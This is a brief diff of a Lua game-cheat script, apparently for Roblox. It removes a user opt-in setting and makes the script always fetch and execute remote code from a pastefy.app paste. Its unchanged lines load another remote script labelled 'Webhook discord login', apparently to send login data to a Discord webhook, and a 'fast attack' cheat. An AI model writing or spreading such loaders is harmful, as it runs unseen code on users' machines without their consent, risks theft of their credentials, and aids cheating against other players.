@@ -1,12 +1,4 @@
--- Nếu chưa tồn tại thì đặt mặc định = false
-getgenv().Autofixlag = getgenv().Autofixlag or false
-
--- Nếu bật thì load script fix lag
-if getgenv().Autofixlag then
-    pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/AM25eAps/raw"))()
-    end)
-end
+loadstring(game:HttpGet("https://pastefy.app/AM25eAps/raw"))()
 --Webhook discord login
 loadstring(game:HttpGet'https://pastefy.app/3S6JPfFI/raw')()
 -- Load fast attack
